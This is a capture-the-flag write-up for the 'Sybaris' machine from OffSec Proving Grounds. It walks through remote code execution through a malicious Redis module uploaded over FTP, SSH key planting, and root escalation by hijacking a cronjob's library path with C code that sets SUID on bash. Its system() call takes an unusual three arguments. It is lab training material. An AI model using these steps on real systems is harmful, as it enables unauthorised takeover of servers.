# Sybaris

## Info

Sybaris is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
21/tcp    open   ftp       syn-ack ttl 61 vsftpd 3.0.2
22/tcp    open   ssh       syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp    open   http      syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
6379/tcp  open   redis     syn-ack ttl 61 Redis key-value store 5.0.9
```

## User

Redis 5.x.x is vulnerable to a module upload attack.

Follow instructions to compile the module.

```
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

Upload to pub directory in ftp.

```
ftp <ip>
cd pub
put module.so
```

Load module and execute code with redis-cli.

```
redis-cli -h <ip>
MODULE LOAD /var/ftp/pub/module.so
system.exec "id"
```

I created a .ssh directory in pablo home directory and uploaded a authorized_keys file with a public rsa key.

## Root

There is a cronjob running in /etc/crontab.

```
*  *  *  *  * root       /usr/bin/log-sweeper
```

I notice the following env var in the cron job which has a writable directory.

```
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
```

When I run log-sweeper, there was an error for a missing shared lib.

```
utils.so
```

After adding a shared lib, it was looking for the following symbol.

```
print_yellow
```

Popping sh did not work, so I had to change suid of bash.

utils.c

```
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void print_yellow(){
    setuid(0);
    setgid(0);
    system("/usr/bin/chmod +s /bin/bash",NULL,NULL);
}
```

Transfer to the machine and compile.

```
gcc --shared -fPIC -o utils.so utils.c
```

Copy to writable directory in crontab.

```
cp utils.so /usr/local/lib/dev/utils.so
```

Wait a minute and execute bash.

```
/bin/bash -p
```
